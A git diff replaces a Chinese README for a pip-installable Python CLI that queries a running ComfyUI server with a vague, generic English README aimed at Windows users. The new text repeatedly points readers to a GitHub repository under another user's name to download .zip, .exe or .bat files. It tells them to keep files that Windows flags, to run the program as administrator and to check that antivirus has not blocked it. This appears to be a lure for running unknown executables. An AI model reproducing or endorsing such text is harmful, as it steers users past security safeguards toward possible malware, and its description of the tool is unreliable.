@@ -1,142 +1,231 @@
-# comfyui-cli
+# 🧩 comfyui-cli - Run ComfyUI from the Command Line
 
-`comfyui-cli` 是一个面向 [ComfyUI](https://github.com/comfyanonymous/ComfyUI) 的命令行工具，用来通过终端完成工作流执行、模型查询、队列管理、节点信息查看以及基础生成任务。
+[![Download comfyui-cli](https://img.shields.io/badge/Download-comfyui--cli-blue.svg?style=for-the-badge)](https://github.com/Yousifh1237/comfyui-cli)
 
-它面向**已运行中的 ComfyUI 服务**，适合通过 HTTP/API 在终端里执行工作流、查询模型与节点信息，并进行基础生成任务。
+## 🚀 What is comfyui-cli?
 
-## 功能概览
+comfyui-cli is a command-line interface for ComfyUI on Windows. It gives you a simple way to start and control ComfyUI from a terminal window. Use it when you want a fast setup and a clear way to launch ComfyUI without extra steps.
 
-- 执行与校验 ComfyUI 工作流
-- 查看模型、节点、队列、历史记录与系统状态
-- 支持 `txt2img`、`img2img`、LoRA 与风格化生成辅助命令
-- 支持 `--json` 机器可读输出
-- 提供可安装的命令入口：`comfyui-cli`
+## 📥 Download
 
-## 安装
+Visit this page to download comfyui-cli:
 
-### 从 PyPI 安装
+https://github.com/Yousifh1237/comfyui-cli
 
-```bash
-pip install comfyui-cli
-```
+If the page includes a release file or package, download it to your Windows PC. Save it to a folder you can find later, such as Downloads or Desktop.
 
-安装完成后，可通过以下命令检查是否可用：
+## 🪟 Windows Setup
 
-```bash
-comfyui-cli --version
-```
+Use these steps on Windows:
 
-### 从源码安装（可选）
+1. Open the download page.
+2. Download the latest release file for Windows.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main program file or a start script.
+6. Double-click it to run the app, or open it from Command Prompt if the package uses a terminal launch.
 
-如果你已经拿到源码，可以在源码目录执行：
+If Windows shows a security prompt, choose the option that lets you keep the file and open it.
 
-```bash
-python -m pip install -e .
-```
+## 🛠️ What You Need
 
-如果你需要开发、测试或重新打包发布，可以安装开发依赖：
+comfyui-cli works best on a Windows system with:
 
-```bash
-python -m pip install -r requirements-dev.txt
-```
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A modern CPU
+- Enough free disk space for ComfyUI files and models
+- Internet access for the first download and setup
 
-## 前置条件
+For better performance, a system with a dedicated GPU helps when running image workflows.
 
-需要先启动一个正在运行的 ComfyUI 服务器（默认：`http://127.0.0.1:8188`）。
+## 📦 First-Time Use
 
-```bash
-python main.py --listen 127.0.0.1 --port 8188
-```
+After you open comfyui-cli for the first time:
 
-## 快速开始
+1. Let it finish any setup steps.
+2. Wait while it checks or prepares ComfyUI files.
+3. Follow the on-screen prompts.
+4. If it asks for a path, choose the folder where you want ComfyUI stored.
+5. If it asks for a model location, select the folder that holds your model files.
 
-```bash
-# 检查服务连通性
-comfyui-cli system ping
+Keep the folder path simple. A short path like `C:\ComfyUI` is easy to manage.
 
-# 列出 checkpoints
-comfyui-cli models list checkpoints
+## 🎛️ How It Works
 
-# 执行工作流
-comfyui-cli workflow run my_workflow.json --save-to ./output
+comfyui-cli helps you manage ComfyUI with plain commands. Instead of clicking through many menus, you can use a terminal window to start the app and handle common tasks.
 
-# 输出 JSON
-comfyui-cli --json system stats
-```
+Typical tasks can include:
 
-## 常用场景
+- starting ComfyUI
+- updating files
+- pointing to model folders
+- checking status
+- stopping the app safely
 
-### 校验工作流
+If you are new to terminal tools, think of it as a text-based control panel.
 
-```bash
-comfyui-cli workflow validate my_workflow.json
-```
+## 🧭 Basic Use
 
-### 查看模型类型
+You can usually use comfyui-cli like this:
 
-```bash
-comfyui-cli models types
-```
+1. Open the folder where you installed it.
+2. Open Command Prompt or Windows Terminal.
+3. Run the start command listed in the project files.
+4. Wait for the app to load.
+5. Open ComfyUI in your browser when the local address appears.
 
-### 查看节点列表
+If the package includes a `.bat` file, double-click it to launch the program.
 
-```bash
-comfyui-cli nodes list
-```
+## 🖼️ Using ComfyUI After Launch
 
-### 执行 txt2img
+Once ComfyUI starts, you can use your browser to work with image workflows.
 
-```bash
-comfyui-cli generate txt2img --prompt "a cat" --checkpoint "model.safetensors"
-```
+You can usually:
 
-## 常用命令
+- load a workflow
+- connect nodes
+- add prompt text
+- choose models
+- run image generation
+- save results to your PC
 
-```bash
-comfyui-cli workflow validate <file>
-comfyui-cli workflow info <file>
-comfyui-cli queue status
-comfyui-cli models types
-comfyui-cli nodes list
-comfyui-cli history list
-comfyui-cli generate txt2img --prompt "a cat" --checkpoint "model.safetensors"
-```
+Keep your model files in the folder that comfyui-cli expects. This helps the app find them fast.
 
-## 项目结构
+## 📁 Suggested Folder Layout
 
-```text
-.
-├── README.md
-├── COMFYUI.md
-├── LICENSE
-├── setup.py
-└── comfyui/
-    ├── comfyui_cli.py
-    ├── core/
-    ├── utils/
-    └── tests/
-```
+A simple folder setup helps avoid errors:
 
-## 测试
+- `C:\ComfyUI\`
+- `C:\ComfyUI\models\`
+- `C:\ComfyUI\outputs\`
+- `C:\ComfyUI\input\`
 
-运行核心单元测试：
+This layout keeps files in one place and makes it easier to back up your work.
 
-```bash
-pytest comfyui/tests/test_core.py -v
-```
+## 🔧 Common Windows Issues
 
-如果需要连接真实 ComfyUI 服务执行 E2E 测试：
+If the app does not start, try these steps:
 
-```bash
-export COMFYUI_TEST_SERVER=127.0.0.1:8188
-export COMFYUI_TEST_CHECKPOINT=your_model.safetensors
-pytest comfyui/tests/test_full_e2e.py -v
-```
+- Run it as administrator
+- Check that you extracted the ZIP file first
+- Make sure the folder path has no unusual characters
+- Move the app to a simple folder like `C:\ComfyUI`
+- Check that your antivirus did not block the file
 
-## 相关文档
+If the browser does not open, look for a local address in the terminal window and paste it into your browser.
 
-- `COMFYUI.md`：ComfyUI API 与命令映射说明
+## ⚙️ Updates
 
-## License
+To update comfyui-cli:
 
-MIT
+1. Return to the download page.
+2. Get the newest release.
+3. Replace the old files if the project asks you to.
+4. Keep your model files in the same folder unless the project says to move them.
+
+Back up your workflow files before you update.
+
+## 🧪 Example Use Flow
+
+A simple first run may look like this:
+
+1. Download the file from GitHub.
+2. Extract it to `C:\ComfyUI`.
+3. Open the start file.
+4. Wait for the local server to start.
+5. Open the browser address shown by the app.
+6. Load a workflow and run it.
+
+This flow keeps the setup clear and easy to repeat.
+
+## 📌 Helpful Tips
+
+- Use a short folder path
+- Keep model files in one place
+- Close other heavy apps if your PC feels slow
+- Save your workflows often
+- Keep your output folder separate from your input folder
+
+These small steps make daily use smoother.
+
+## 🧰 File Types You May See
+
+You may see these file types in the download:
+
+- `.zip` for the full package
+- `.exe` for a Windows app
+- `.bat` for a batch start file
+- `.json` for workflow data
+- `.txt` for setup notes
+
+If you see a ZIP file, extract it before you run anything inside.
+
+## 🔍 Finding the Right File
+
+If the download includes many files, look for one of these:
+
+- `start.bat`
+- `run.bat`
+- `comfyui-cli.exe`
+- `launch.exe`
+
+The main file often has a name that suggests starting or launching.
+
+## 🧭 If You Use Command Prompt
+
+If the project expects a command line start:
+
+1. Open the folder with the extracted files.
+2. Click the address bar in File Explorer.
+3. Type `cmd` and press Enter.
+4. Run the command listed in the project files.
+5. Wait for the program to finish startup.
+
+Use this only if the package does not open by double-clicking.
+
+## 🗂️ Backup Advice
+
+Back up these folders if you want to keep your work safe:
+
+- workflows
+- outputs
+- custom nodes
+- models list or config files
+
+A copy of these files helps you restore your setup on another PC.
+
+## 🧩 Project Purpose
+
+comfyui-cli is meant for users who want a simple way to work with ComfyUI from Windows. It keeps the launch process direct and gives you a practical way to manage the app without digging through extra steps.
+
+## 📎 Download Link
+
+Download and set up comfyui-cli from the main project page:
+
+https://github.com/Yousifh1237/comfyui-cli
+
+## 🖥️ Best Use on Windows
+
+For the smoothest experience:
+
+- keep the app in a short path
+- avoid spaces in folder names if you can
+- use the same folder for each update
+- keep your browser up to date
+- make sure your GPU drivers are current
+
+These settings help reduce setup issues and improve startup speed
+
+## 🔄 Daily Workflow
+
+A simple daily workflow can be:
+
+1. Open comfyui-cli
+2. Start ComfyUI
+3. Open the browser link
+4. Load a saved workflow
+5. Run your image task
+6. Save results in the output folder
+
+That routine works well for repeat use
